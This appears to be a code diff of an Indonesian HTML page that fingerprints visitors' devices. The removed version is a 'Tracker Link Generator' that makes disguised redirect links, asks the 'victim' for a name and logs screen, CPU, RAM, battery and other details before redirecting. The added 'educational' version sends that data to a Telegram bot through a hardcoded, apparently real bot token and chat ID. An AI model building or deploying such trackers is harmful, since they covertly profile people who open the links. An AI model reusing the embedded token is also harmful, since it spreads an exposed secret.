@@ -2,116 +2,116 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Tracker Link Generator</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Device Info Tracker Edukasi</title>
 <style>
-  body {font-family: Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px;}
-  h1 {color:#00ffcc;}
-  .box {background:#161b22;padding:15px;border-radius:10px;margin:15px 0;}
-  input, button {padding:10px;border-radius:8px;border:none;margin:5px 0;}
-  button {background:#00ffcc;color:#111;cursor:pointer;font-weight:bold;}
-  a {color:#00ffcc;}
-  pre {background:#111;padding:10px;border-radius:8px;white-space:pre-wrap;}
+  body { background: #0d1117; color: #c9d1d9; font-family: Arial, sans-serif; padding: 20px; }
+  pre { background: #161b22; padding: 15px; border-radius: 8px; white-space: pre-wrap; }
+  button { background: #238636; color: white; border: none; padding: 10px 20px; margin-top: 15px; cursor: pointer; border-radius: 5px; font-size: 16px; }
 </style>
 </head>
 <body>
-<h1>🔗 Tracker Link Generator</h1>
-
-<div class="box">
-  <h3>Buat Link Tracker</h3>
-  <input type="text" id="targetUrl" placeholder="https://example.com">
-  <button onclick="generateTracker()">Generate</button>
-  <p id="generatedLink"></p>
-</div>
-
-<div class="box">
-  <h3>Log Tracking</h3>
-  <pre id="logBox">Belum ada data...</pre>
-</div>
+<h1>Device Info Tracker (Edukasi)</h1>
+<pre id="info">Mengambil data...</pre>
+<button id="send">Kirim ke Bot Telegram</button>
 
 <script>
-  // --- Generate tracker link
-  function generateTracker() {
-    let url = document.getElementById("targetUrl").value.trim();
-    if (!url) { alert("Masukkan URL dulu!"); return; }
-    let trackerUrl = window.location.origin + window.location.pathname + "?redirect=" + encodeURIComponent(url);
-    document.getElementById("generatedLink").innerHTML = `<a href="${trackerUrl}" target="_blank">${trackerUrl}</a>`;
-  }
+function parseOS(ua) {
+  if (/Windows/.test(ua)) return "Windows";
+  if (/Macintosh/.test(ua)) return "MacOS";
+  if (/Linux/.test(ua)) return "Linux";
+  if (/Android/.test(ua)) return "Android";
+  if (/iPhone|iPad/.test(ua)) return "iOS";
+  return "Unknown";
+}
 
-  // --- Ambil info device
-  async function getDeviceInfo(target, victimText) {
-    let v = {};
-    v.url = target;
-    v.text = victimText || "N/A";
-    v.user_agent = navigator.userAgent;
-    v.platform = navigator.platform;
-    v.screen = `${screen.width}x${screen.height}`;
-    v.window = `${window.innerWidth}x${window.innerHeight}`;
-    v.orientation = screen.orientation?.type || "N/A";
-    v.dpr = window.devicePixelRatio;
-    v.cpu = navigator.hardwareConcurrency || "N/A";
-    v.ram = navigator.deviceMemory || "N/A";
-    v.language = navigator.language;
-    v.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    v.touch = 'ontouchstart' in window;
-    v.maxTouchPoints = navigator.maxTouchPoints || 0;
-    v.cookies = navigator.cookieEnabled;
-    v.online = navigator.onLine;
-    v.doNotTrack = navigator.doNotTrack;
-    v.webdriver = navigator.webdriver;
-    v.pdfViewerEnabled = navigator.pdfViewerEnabled || false;
+function parseBrowser(ua) {
+  if (/Chrome/.test(ua)) return "Chrome";
+  if (/Firefox/.test(ua)) return "Firefox";
+  if (/Safari/.test(ua) && !/Chrome/.test(ua)) return "Safari";
+  if (/Edge/.test(ua)) return "Edge";
+  return "Unknown";
+}
 
-    try {
-      const devices = await navigator.mediaDevices.enumerateDevices();
-      v.audioIn = devices.filter(d => d.kind === "audioinput").length;
-      v.audioOut = devices.filter(d => d.kind === "audiooutput").length;
-      v.videoIn = devices.filter(d => d.kind === "videoinput").length;
-    } catch {
-      v.audioIn = v.audioOut = v.videoIn = 0;
-    }
+async function getDeviceInfo() {
+  const v = {};
+  const now = new Date();
+  v.ip = "127.0.0.1"; // Hanya placeholder, untuk IP asli perlu izin server
+  v.access_time = now.toISOString();
+  v.local_time = now.toLocaleString();
 
-    v.connection = navigator.connection || {};
-    try {
-      const battery = await navigator.getBattery();
-      v.battery = { level: (battery.level*100) + "%", charging: battery.charging ? "Ya" : "Tidak" };
-    } catch { v.battery = { level:"N/A", charging:"N/A" }; }
+  v.user_agent = navigator.userAgent;
+  v.platform = navigator.platform;
+  v.screen = `${screen.width}x${screen.height}`;
+  v.window = `${window.innerWidth}x${window.innerHeight}`;
+  v.orientation = screen.orientation ? screen.orientation.type : 'unknown';
+  v.dpr = window.devicePixelRatio || 1;
 
-    v.time = new Date().toLocaleString();
-    return v;
-  }
+  v.cpu = navigator.hardwareConcurrency || 'N/A';
+  v.ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : 'N/A';
+  v.language = navigator.language;
+  v.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-  // --- Simpan log
-  function saveLog(info) {
-    let logs = JSON.parse(localStorage.getItem("trackerLogs") || "[]");
-    logs.push(info);
-    localStorage.setItem("trackerLogs", JSON.stringify(logs));
-  }
+  v.touch = 'ontouchstart' in window;
+  v.maxTouchPoints = navigator.maxTouchPoints || 0;
+  v.cookies = navigator.cookieEnabled;
+  v.online = navigator.onLine;
 
-  // --- Tampilkan log
-  function showLogs() {
-    let logs = JSON.parse(localStorage.getItem("trackerLogs") || "[]");
-    if(logs.length===0){document.getElementById("logBox").innerText="Belum ada data...";return;}
-    let text = "";
-    logs.forEach((v,i)=>{
-      text += `[${i+1}] ${v.time}\nDevice: ${v.user_agent}\nPlatform: ${v.platform}\nScreen: ${v.screen}\nWindow: ${v.window}\nOrientation: ${v.orientation}\nCPU: ${v.cpu}\nRAM: ${v.ram} GB\nLanguage: ${v.language}\nBattery: ${v.battery.level}, Charging: ${v.battery.charging}\nRedirect: ${v.url}\n------------------------------------------------\n`;
-    });
-    document.getElementById("logBox").innerText = text;
-  }
+  v.doNotTrack = navigator.doNotTrack;
+  v.webdriver = navigator.webdriver || false;
+  v.pdfViewerEnabled = !!navigator.pdfViewerEnabled;
 
-  // --- Eksekusi jika ada redirect
-  const params = new URLSearchParams(window.location.search);
-  if(params.has("redirect")){
-    let target = params.get("redirect");
-    let victimText = prompt("Masukkan teks / nama Anda:") || "N/A";
+  const template = `
+IP: ${v.ip} | Time: ${v.access_time}
+⏳ Date In Device: ${v.local_time}
 
-    getDeviceInfo(target, victimText).then(info=>{
-      saveLog(info);
-      showLogs();
-      setTimeout(()=>{
-        try{window.location.href = target;}
-        catch(e){alert("Redirect gagal, silakan klik link: "+target);}
-      }, 1500);
-    });
-  } else { showLogs(); }
+📱 DEVICE OVERVIEW
+📲 Device Name: ${v.user_agent}
+💻 Operating System: ${parseOS(v.user_agent)}
+🌐 Browser: ${parseBrowser(v.user_agent)}
+🔧 Platform: ${v.platform || 'N/A'}
+
+🖥️ DISPLAY DETAILS
+📐 Screen Size: ${v.screen}
+🪟 Window Size: ${v.window}
+🎨 Color Quality: 24-bit
+🔄 Orientation: ${v.orientation || 'unknown'}
+📊 Pixel Density: ${v.dpr}x
+
+⚡ PERFORMANCE INFO
+🧠 CPU Cores: ${v.cpu}
+💾 Device RAM: ${v.ram}
+🌍 Language: ${v.language}
+🕐 Timezone: ${v.timezone}
+
+👆 INPUT CAPABILITIES
+📱 Touch Screen: ✅ ${v.touch ? 'Yes' : 'No'}
+🖐️ Max Touch Points: ${v.maxTouchPoints || 'N/A'}
+🍪 Cookies: ✅ ${v.cookies ? 'Enabled' : 'Disabled'}
+🌐 Online Status: ✅ ${v.online ? 'Connected' : 'Disconnected'}
+
+🔒 SECURITY FEATURES
+🚫 Do Not Track: ${v.doNotTrack === '1' ? '✅ Enabled' : '❌ Disabled'}
+🤖 Webdriver: ${v.webdriver ? '❌ Detected' : '✅ Not Detected'}
+📄 PDF Viewer: ${v.pdfViewerEnabled ? '✅ Available' : '❌ Not Available'}
+`;
+  document.getElementById("info").innerText = template;
+  return v;
+}
+
+async function sendToTelegram(v) {
+  const botToken = "7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8"; // ganti token bot Telegram
+  const chatId = "-1003094524054";     // ganti chat ID
+  const message = encodeURIComponent("Device Info Edukasi:\n" + JSON.stringify(v, null, 2));
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
+}
+
+document.getElementById("send").addEventListener("click", async () => {
+  const v = await getDeviceInfo();
+  await sendToTelegram(v);
+});
+
+getDeviceInfo();
 </script>
 </body>
 </html>
